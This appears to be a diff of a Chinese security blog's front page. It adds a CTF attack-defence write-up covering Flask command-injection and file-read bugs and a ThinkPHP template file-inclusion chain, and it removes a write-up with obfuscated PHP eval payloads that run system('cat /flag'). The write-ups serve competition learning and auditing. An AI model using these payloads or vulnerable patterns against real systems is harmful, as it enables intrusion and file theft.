@@ -90,6 +90,189 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/10/20/字节跳动CTF线下赛Web题解&复盘/"> 
+                    字节跳动CTF线下赛Web题解&amp;复盘 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-10-20   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWD/">AWD</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="字节跳动CTF线下赛Web题解-amp-复盘"><a href="#字节跳动CTF线下赛Web题解-amp-复盘" class="headerlink" title="字节跳动CTF线下赛Web题解&amp;复盘"></a>字节跳动CTF线下赛Web题解&amp;复盘</h1><h1 id="PythonWeb"><a href="#PythonWeb" class="headerlink" title="PythonWeb"></a>PythonWeb</h1><h2 id="做题小谈"><a href="#做题小谈" class="headerlink" title="做题小谈"></a>做题小谈</h2><p>之前线下赛没运维过pythonweb，踩了很多坑，小记一下。</p>
+<p>flask在更改代码后要重启才能生效，但是如果<code>app.DEBUG=True</code>则不需要重启flask，这个配置多见于<code>config.py</code>，比赛的时候也可以全局搜索。</p>
+<p>目录结构如下<br><img src="http://static.zybuluo.com/1160307775/44a650nlxazo4hlxfio2jpd6/image_1dnm2lc67dmv18gg4fn1d95fq5m.png" alt="image_1dnm2lc67dmv18gg4fn1d95fq5m.png-112.2kB"></p>
+<p>在pyweb的awd中，<strong>一定要先<code>ps -ef</code>看一下系统的进程，看看原始的服务是怎么启动的，我们就可以照着它的命令去重启flask</strong>，而不至于把服务启崩。这次我就是没有看进程，自己相当然的用命令<code>flask run</code>，结果被down了好几轮。</p>
+<p>最后看了下手册，这里pyweb使用gunicorn来启动的：</p>
+<pre><code>gunicorn -b 0.0.0.0:5000  manage:app</code></pre><h2 id="漏洞审计"><a href="#漏洞审计" class="headerlink" title="漏洞审计"></a>漏洞审计</h2><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><pre><code>@main.route(&#39;/file&#39;)
+def file():
+    file = request.args.get(&#39;file&#39;,base64.b64encode(&#39;/tmp/Blog_mini/app/static/images/background.jpg&#39;))
+    f = open(base64.b64decode(file),&#39;rb&#39;)
+    res = f.read()
+    return jsonify({&quot;res&quot;:res})</code></pre><p>request.args.get()获取file参数，如果参数不存在则为<code>base64.b64encode(&#39;/tmp/Blog_mini/app/static/images/background.jpg)</code></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>后台有一点路由<code>/backup</code>，可以调用popen()，那就可以先注册用户，再去rce。同时这个点应该也可以读取任意文件</p>
+<pre><code>@main.route(&#39;/backup&#39;,methods = [&#39;GET&#39;])
+@login_required
+def backup():
+    if request.args.get(&#39;name&#39;):
+        shell = &#39;tar -zcf ./&#39;+ request.args.get(&#39;name&#39;) +&#39;.tar.gz ./&#39;
+        res = os.popen(shell).read()
+        ress = {&quot;res&quot;:res}
+        return jsonify(ress)
+    else:
+        return &quot;param is name! please backup!&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/xkcvhk7x2py4e8psnoftecq0/image_1dnm8r3b65901pom16tg12t1c031g.png" alt="image_1dnm8r3b65901pom16tg12t1c031g.png-34.8kB"></p>
+<h3 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h3><p>这个点我没挖到，但是感觉是存在的。在auth逻辑处是这样写的</p>
+<pre><code>@auth.route(&#39;/register&#39;, methods=[&#39;GET&#39;,&#39;POST&#39;])
+def register():
+    form  = RegisterForm()
+    if form.validate_on_submit():
+        user = User.query.filter_by(email=form.email.data).first()
+        if user is not None:
+            flash(u&#39;用户已经存在，注册失败&#39;, &#39;danger&#39;)
+            return render_template(&#39;auth/register.html&#39;,form=form)
+        else:
+            if(User.insert_admin(form.email.data,form.email.data,form.password.data)):
+                flash(u&#39;注册成功，请登录&#39;, &#39;success&#39;)
+                return redirect(url_for(&#39;auth.login&#39;))
+            else:
+                flash(u&#39;注册失败了，请重试&#39;, &#39;danger&#39;)
+    return render_template(&#39;auth/register.html&#39;, form=form)
+
+@auth.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def login():
+    form = LoginForm()
+    if form.validate_on_submit():
+        user = User.query.filter_by(email=form.email.data).first()
+        if user is not None and user.verify_password(form.password.data):
+            login_user(user)
+            flash(u&#39;登陆成功！欢迎回来，%s!&#39; % user.username, &#39;success&#39;)
+            return redirect(request.args.get(&#39;next&#39;) or url_for(&#39;main.index&#39;))
+        else:
+            flash(u&#39;登陆失败！用户名或密码错误，请重新登陆。&#39;, &#39;danger&#39;)
+    if form.errors:
+        flash(u&#39;登陆失败，请尝试重新登陆.&#39;, &#39;danger&#39;)
+
+    return render_template(&#39;auth/login.html&#39;, form=form)</code></pre><p>很明显调用了<code>render_template</code>，如果登陆失败也会进入render_template渲染，而这个函数恰好是jinjia2 ssti的经典漏洞函数。感觉应该也可以采取注册payload用户名-&gt;ssti</p>
+<h2 id="流量记录"><a href="#流量记录" class="headerlink" title="流量记录"></a>流量记录</h2><p>这次还是吃了没流量的亏，测试了一下别人的py流量脚本，这里贴出来</p>
+<pre><code>@main.before_request
+def awdlog():
+    import time
+    f = open(&#39;/tmp/pylog.txt&#39;,&#39;a+&#39;)
+    f.writelines(time.strftime(&#39;%Y-%m-%d %H:%M:%S\n&#39;, time.localtime(time.time())))
+    f.writelines(&quot;{method} {url} \n&quot;.format(method=request.method,url=request.url))
+    s = &#39;&#39;
+    for d,v in dict(request.headers).items():
+        s += &quot;%s: %s\n&quot;%(d,v)
+    f.writelines(s+&#39;\n&#39;)
+    s = &#39;&#39;
+    for d,v in dict(request.form).items():
+        s += &quot;%s=%s&amp;&quot;%(d,v)
+    f.writelines(s.strip(&quot;&amp;&quot;))
+    f.writelines(&#39;\n\n&#39;)
+    f.close()</code></pre><p><strong>main</strong>指的是应用名，每次根据实际情况更改，最终在/tmp下生成日志<br><img src="http://static.zybuluo.com/1160307775/4ly8u0z2pqen24kyzhml5qt1/image_1dnn61c77p61mvu1v011ini1qtt7e.png" alt="image_1dnn61c77p61mvu1v011ini1qtt7e.png-533.4kB"></p>
+<h1 id="Opensns"><a href="#Opensns" class="headerlink" title="Opensns"></a>Opensns</h1><p>基于TP3.2.2开发，比赛复现出两个漏洞。其中一个是内置后门就不说了，还有一个是渲染模版时的任意文件读取漏洞</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="任意文件读取-1"><a href="#任意文件读取-1" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><code>keywords[_filename]=/flag</code></p>
+<p>漏洞点在<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>的File类驱动中，同时File类继承自Storage类：<code>class File extends Storage</code></p>
+<p><img src="http://static.zybuluo.com/1160307775/19r0bw8jrs4a14a8r9emc8c6/image_1dnmqjgof1rfhksv1ae71engq2320.png" alt="image_1dnmqjgof1rfhksv1ae71engq2320.png-396.7kB"></p>
+<p>在判断了$vars是否存在后，进行了一次变量覆盖，再调用load方法进行了文件包含。追踪一下哪里调用了load方法，发现都是在解析模版的时候调用load，这里选择<code>ThinkPHP/ThinkPHP/Library/Think/Template.class.php</code>的fetch()方法</p>
+<p><img src="http://static.zybuluo.com/1160307775/qoihow4a22x8pzdf9i9eoxiv/image_1dnmrrf2k138168g9gm12sfoip2t.png" alt="image_1dnmrrf2k138168g9gm12sfoip2t.png-245.5kB"></p>
+<p>发现可控参数<code>$templateVar</code>，会被当作实参传入load()，继续寻找调用fetch()方法的位置。因为TP代码有好多中实例化的方法，并不都像<code>storage::</code>这样的调用方式，只能全局搜索fetch看哪里调用。最终发现在<code>ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code>中实例化了Template类并且调用fetch()方法。</p>
+<p><img src="http://static.zybuluo.com/1160307775/fmsgcdfr846jsn5g71sardnt/image_1dnms90lf1fbckc91cnr18281g1c3a.png" alt="image_1dnms90lf1fbckc91cnr18281g1c3a.png-505.2kB"></p>
+<p>刚才说到可控参数<code>$templateVar</code>的原型在这里为<code>$_data</code>，那么<code>$_data</code>是否可控？继续追调用链，这里往回追的时候就卡壳了，因为涉及到tp的一个知识：<a href="https://blog.csdn.net/u013927110/article/details/47000379" target="_blank" rel="noopener">Thinkphp下利用钩子使用行为扩展</a></p>
+<p>简单来说就在xx宏定义了监听器对应的类名(这里的类指的是类似于ParseTemplateBehavior.class.php这种的行为拓展类)<br><img src="http://static.zybuluo.com/1160307775/ab7rmh3hiapj8i4ns6dqrwvi/image_1dnmt4sfa1c6ja0pgb4v00mft4q.png" alt="image_1dnmt4sfa1c6ja0pgb4v00mft4q.png-50.2kB"></p>
+<p>Hook机制通过触发不同的监听器，实现对应行为拓展类的实例化且会调用对应行为拓展类的run方法。一个简单的触发机制就是<code>Hook::Listen(tags,prarm)</code>。</p>
+<p>那么在这里我们希望它触发<code>view_parse</code>，从而实例化<code>ParseTemplateBehavior</code>。就全局搜索<code>Hook::listen(&#39;view_parse&#39;</code>。在TP的视图类里找到了该监听器的hook<br><img src="http://static.zybuluo.com/1160307775/d7u78w1qao6dkos6xtce62gw/image_1dnmtdrpd6t6101m1omechn1n0857.png" alt="image_1dnmtdrpd6t6101m1omechn1n0857.png-507.6kB"></p>
+<p>接下来就好说了，只要<code>$parama</code>可控，并且找到一处能够调用fetch函数的地方，整条利用链就完整了。</p>
+<p>其中$param的取值经过一系列的操作</p>
+<pre><code>public function assign($name, $value = &#39;&#39;)
+{
+    if (is_array($name)) {
+        $this-&gt;tVar = array_merge($this-&gt;tVar, $name);
+    } else {
+        $this-&gt;tVar[$name] = $value;
+    }
+}
+
+$params = array(&#39;var&#39; =&gt; $this-&gt;tVar, &#39;file&#39; =&gt; $templateFile, &#39;content&#39; =&gt; $content, &#39;prefix&#39; =&gt; $prefix);</code></pre><p>这里file、content、prefix为定值，只有<code>$this-&gt;tvar</code>可操作且被assign函数赋值。这里存在以前tp3的模版rce漏洞，只不过是前半部分的利用链，通过assign这个模版赋值函数，赋值变量<code>$this-&gt;tvar</code>。</p>
+<p>同时这里还涉及Tp的一个小操作，对模版的加载&amp;渲染依靠<code>ThinkPHP/ThinkPHP/Library/Think/View.class.php</code>。先通过类内方法<code>assgin()</code>对模版赋值，再调用<code>display()</code>加载模板和页面输出。在display函数的内部同时实现了<code>fetch()</code>函数解析并获取模板内容，也解决了上面调用fetch函数的困扰。</p>
+<p>所以只需要找一个Controller，接受post/get传入参数，并且能够传入<code>assign()</code>去模版赋值，之后再经过tp的<code>display()</code>函数渲染模版，这里出题人在控制器里造了一个方法search，接受keywords参数</p>
+<pre><code>public function search()
+{
+    $keywords=I(&#39;post.keywords&#39;,&#39;&#39;,&#39;text&#39;);
+
+    $modules = D(&#39;Common/Module&#39;)-&gt;getAll();
+    foreach ($modules as $m) {
+        if ($m[&#39;is_setup&#39;] == 1 &amp;&amp; $m[&#39;entry&#39;] != &#39;&#39;) {
+            if (file_exists(APP_PATH . $m[&#39;name&#39;] . &#39;/Widget/SearchWidget.class.php&#39;)) {
+                $mod[] = $m[&#39;name&#39;];
+            }
+        }
+    }
+    $show_search = get_kanban_config(&#39;SEARCH&#39;, &#39;enable&#39;, $mod, &#39;Home&#39;);
+
+    $this-&gt;assign($keywords);
+    $this-&gt;assign(&#39;showBlocks&#39;, $show_search);
+    $this-&gt;display();
+}</code></pre><p>构造如下poc本地包含文件，由于开启了ob_start()。<br><img src="http://static.zybuluo.com/1160307775/rxlpeekkh3xij9ql2ltkfr7m/image_1dnn1fspe10st1i4rbe6nt1p6g5k.png" alt="image_1dnn1fspe10st1i4rbe6nt1p6g5k.png-208.2kB"></p>
+<p>总结来说，该点漏洞就是加载模版的时候，把本地文件作为模版变量赋值，再渲染到页面。这个在平常的代码审计中也是一个不错的思路，膜出题人。</p>
+<h1 id="douchat"><a href="#douchat" class="headerlink" title="douchat"></a>douchat</h1><p>同样使用TP3.2.2开发的</p>
+<h2 id="漏洞浮现"><a href="#漏洞浮现" class="headerlink" title="漏洞浮现"></a>漏洞浮现</h2><h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>跟opensns类似的漏洞，也是模版的渲染，只不过这次存在content参数，即生成的缓存有效时，加载缓存造成代码注入。由于开启了ob_start()，因此在include的时候代码注入<br><img src="http://static.zybuluo.com/1160307775/rqxm9hrlwxtkdfxn6xznrey2/image_1dnn52qdims3v3217dm1s6ph8f6h.png" alt="image_1dnn52qdims3v3217dm1s6ph8f6h.png-535.2kB"></p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>漏洞文件：/Public/Plugins/webuploader/server/preview.php</p>
+<pre><code>$src = file_get_contents(&#39;php://input&#39;);
+if (preg_match(&quot;#^data:image/(\w+);base64,(.*)$#&quot;, $src, $matches)) {
+
+    $previewUrl = sprintf(
+        &quot;%s://%s%s&quot;,
+        isset($_SERVER[&#39;HTTPS&#39;]) &amp;&amp; $_SERVER[&#39;HTTPS&#39;] != &#39;off&#39; ? &#39;https&#39; : &#39;http&#39;,
+        $_SERVER[&#39;HTTP_HOST&#39;],
+        $_SERVER[&#39;REQUEST_URI&#39;]
+    );
+    $previewUrl = str_replace(&quot;preview.php&quot;, &quot;&quot;, $previewUrl);
+
+
+    $base64 = $matches[2];
+    $type = $matches[1];
+    if ($type === &#39;jpeg&#39;) {
+        $type = &#39;jpg&#39;;
+    }
+
+    $filename = md5($base64).&quot;.$type&quot;;
+    $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;
+
+    if (file_exists($filePath)) {
+        die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&#39;.$previewUrl.&#39;preview/&#39;.$filename.&#39;&quot;, &quot;id&quot; : &quot;id&quot;}&#39;);
+    } else {
+        $data = base64_decode($base64);
+        file_put_contents($filePath, $data);
+        die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;&#39;.$previewUrl.&#39;preview/&#39;.$filename.&#39;&quot;, &quot;id&quot; : &quot;id&quot;}&#39;);
+    }
+
+} else {
+    die(&#39;{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;error&quot; : {&quot;code&quot;: 100, &quot;message&quot;: &quot;un recoginized source&quot;}}&#39;);
+}</code></pre><p><code>$src</code>可控，通过伪协议控制生成的文件名，然后写入到preview/下并回显出来</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/10/20/字节跳动CTF线下赛Web题解&复盘/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/"> 
                     RealWorld CTF2019 两道XSS-Web题解 
                 </a>
@@ -209,7 +392,7 @@ setCookie(&quot;tag&quot;, tag);</code></pre><p>追到函数不难发现是tag�
             </div>
             <div class="continue">
             <a href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -651,7 +834,7 @@ error_log(&#39;&#39;,1);
             </div>
             <div class="continue">
             <a href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -768,7 +951,7 @@ if($enews==&quot;AddIndexpage&quot;)
             </div>
             <div class="continue">
             <a href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -939,7 +1122,7 @@ namespace{
             </div>
             <div class="continue">
             <a href="/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1043,7 +1226,7 @@ cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数
             </div>
             <div class="continue">
             <a href="/2019/08/13/从一次漏洞挖掘入门ldap注入/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1204,7 +1387,7 @@ cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数
             </div>
             <div class="continue">
             <a href="/2019/08/10/HTTP Desync Attacks-Smashing into the Cell Next Door/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1316,7 +1499,7 @@ launch</code></pre><p><img src="http://static.zybuluo.com/1160307775/uefh1iezrvi
             </div>
             <div class="continue">
             <a href="/2019/08/06/De1CTF-Giftbox题解/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1393,7 +1576,7 @@ eval($_REQUEST[a]);
             </div>
             <div class="continue">
             <a href="/2019/07/29/CISCN 2019 Final Web11复盘/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1448,86 +1631,7 @@ window[0] ;</code></pre><p>id值是一个全局变量，下例中test这个”id
             </div>
             <div class="continue">
             <a href="/2019/07/02/前端全局变量劫持/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/"> 
-                    2019国赛Web线上题目Lovemath多解WP 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2019-04-23   
-                </a>
-                
-                
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h1 id="2019国赛Web线上题目Lovemath多解WP"><a href="#2019国赛Web线上题目Lovemath多解WP" class="headerlink" title="2019国赛Web线上题目Lovemath多解WP"></a>2019国赛Web线上题目Lovemath多解WP</h1><p>题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。</p>
-<h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><pre><code class="php">&lt;?php 
-error_reporting(0); 
-//听说你很喜欢数学，不知道你是否爱它胜过爱flag 
-if(!isset($_GET[&#39;c&#39;])){ 
-    show_source(__FILE__); 
-}else{ 
-    //例子 c=20-1 
-    $content = $_GET[&#39;c&#39;]; 
-    if (strlen($content) &gt;= 80) { 
-        die(&quot;太长了不会算&quot;); 
-    } 
-    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;]; 
-    foreach ($blacklist as $blackitem) { 
-        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) { 
-            die(&quot;请不要输入奇奇怪怪的字符&quot;); 
-        } 
-    } 
-    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp 
-    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
-    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs); 
-    foreach ($used_funcs[0] as $func) { 
-        if (!in_array($func, $whitelist)) { 
-            die(&quot;请不要输入奇奇怪怪的函数&quot;); 
-        } 
-    } 
-    //帮你算出答案 
-    eval(&#39;echo &#39;.$content.&#39;;&#39;); 
-
-}</code></pre>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。<br><img src="http://static.zybuluo.com/1160307775/rd7dioxl1v60noellw9opm0m/image_1d94aluchp6k1a607ht1ml2132q9.png" alt="image_1d94aluchp6k1a607ht1ml2132q9.png-224.4kB"></p>
-<p>也就是说只允许Eval使用白名单的函数做字符串</p>
-<p>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="http://static.zybuluo.com/1160307775/73g78cw6hxwdepx0wny3oloy/image_1d9419hr91e511p621k4l177k1a5726.png" alt="image_1d9419hr91e511p621k4l177k1a5726.png-31.6kB"></p>
-<p>想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下<br><img src="http://static.zybuluo.com/1160307775/u1tsyajx6w5bpj9o8bksaa6e/image_1d94aoodi184tdml1udl7q91b0gm.png" alt="image_1d94aoodi184tdml1udl7q91b0gm.png-126.9kB"></p>
-<p>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下<br><img src="http://static.zybuluo.com/1160307775/6otny6nfb85kfltkdhoutv2b/image_1d94ard4e1orte5mo6a1oj6hjj1j.png" alt="image_1d94ard4e1orte5mo6a1oj6hjj1j.png-396.7kB"></p>
-<h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><p>因为字符串长度限制，我最开始的想法是这样的：</p>
-<pre><code>$input = hexdec(bin2hex(&quot;system(&#39;cat /flag&#39;);&quot;))
-$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</code></pre><p>完整转换是这样：</p>
-<pre><code>base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</code></pre><p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p>
-<pre><code>base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</code></pre><p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p>
-<p>正好79个字母堪称完美…解码后的调用栈如下<br><img src="http://static.zybuluo.com/1160307775/u3la0kpp7bgngowxzez2nx21/image_1d941l8bp14ag1cq1eil1hi57ti3d.png" alt="47138-&gt;exec"></p>
-<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><p>这个是看到ROIS队伍师傅的poc</p>
-<pre><code>$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})</code></pre><p>解码出来是<code>system(getallheaders(){9})</code></p>
-<p>也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法</p>
-<h1 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h1><p>这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf</p>
-<pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$p){1})</code></pre><p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p>
-<p>直接发包给到C参数，成功getflag。<br><img src="http://static.zybuluo.com/1160307775/kbdgi0lo22k9ho6p51u4c325/image_1d9427hgv862p0f8bluecra94k.png" alt="image_1d9427hgv862p0f8bluecra94k.png-83.5kB"></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2019/04/23/2019国赛Web线上题目Lovemath多解WP/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -1535,7 +1639,7 @@ $result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</co
 </section>
 
   <nav class="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
   </nav>
 
     </main>
